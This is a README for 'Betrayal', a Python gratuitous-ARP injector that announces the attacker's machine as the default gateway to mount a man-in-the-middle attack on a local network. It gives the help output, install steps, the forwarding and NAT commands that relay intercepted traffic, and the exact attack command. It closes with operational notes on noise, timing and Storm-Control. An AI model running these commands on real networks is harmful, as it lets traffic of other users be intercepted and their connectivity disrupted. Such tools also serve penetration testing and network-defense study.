# Betrayal
Gratuitous ARP Injector

```
python3 Betrayal.py --help                                                                                                                      2 

 ▄▄▄▄   ▓█████▄▄▄█████▓ ██▀███   ▄▄▄     ▓██   ██▓ ▄▄▄       ██▓    
▓█████▄ ▓█   ▀▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    ▒██  ██▒▒████▄    ▓██▒    
▒██▒ ▄██▒███  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄   ▒██ ██░▒██  ▀█▄  ▒██░    
▒██░█▀  ▒▓█  ▄░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██  ░ ▐██▓░░██▄▄▄▄██ ▒██░    
░▓█  ▀█▓░▒████▒ ▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒ ░ ██▒▓░ ▓█   ▓██▒░██████▒
░▒▓███▀▒░░ ▒░ ░ ▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░  ██▒▒▒  ▒▒   ▓▒█░░ ▒░▓  ░
▒░▒   ░  ░ ░  ░   ░      ░▒ ░ ▒░  ▒   ▒▒ ░▓██ ░▒░   ▒   ▒▒ ░░ ░ ▒  ░
 ░    ░    ░    ░        ░░   ░   ░   ▒   ▒ ▒ ░░    ░   ▒     ░ ░   
 ░         ░  ░           ░           ░  ░░ ░           ░  ░    ░  ░
      ░                                   ░ ░                                                                                                             
    
Gratuitous ARP Injector
Author: Magama Bazarov, @in9uz, <in9uz@protonmail.com>

usage: Betrayal.py [-h] --gateway GATEWAY --interface INTERFACE --mac EVILMAC

options:
  -h, --help            show this help message and exit
  --gateway GATEWAY     Choose gateway IP address
  --interface INTERFACE
                        Choose your interface for attack
  --mac EVILMAC         Specify your MAC Address
```

## Mechanics
It is a modification of ARP spoofing. The script will shout at the entire channel segment that your computer is the default gateway by sending Gratuitous ARP messages.
Gratuitous ARP is a special ARP frame that sends out an announcement that a new binding of MAC address and IP address has occurred. This can be used by an attacker to conduct an MTIM attack, run a script against the router's IP address.

The scanner waits for the following arguments as input:
  - network interface (--interface)
  - your MAC Address (--mac)
  - IP address of gateway (--gateway)
  
## How to use it

1. Install dependencies
```
git clone https://github.com/in9uz/Betrayal
sudo pip3 install -r requirements.txt
```
2. Enable Forwarding, SNAT, NAT Helper 
```
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o ethX -j MASQUERADE
sudo modprobe nf_conntrack
echo "1" > /proc/sys/net/netfilter/nf_conntrack_helper
```
3. Attack
```
sudo python3 Betrayal.py --interface ethX --mac XX:XX:XX:XX:XX:XX --gateway <GW IP>
```
## Limitations
This attack is very noisy.
The tool does not restore the structure of ARP tables by itself. After the attack stops, the gateway's MAC address on the clients will change only after 5 minutes. Understand how ARP works.
GARP frames are sent every 800 ms. You can edit the script code and change the delay before sending the next frame, but be careful. There is a chance to strigger the Storm-Control system.
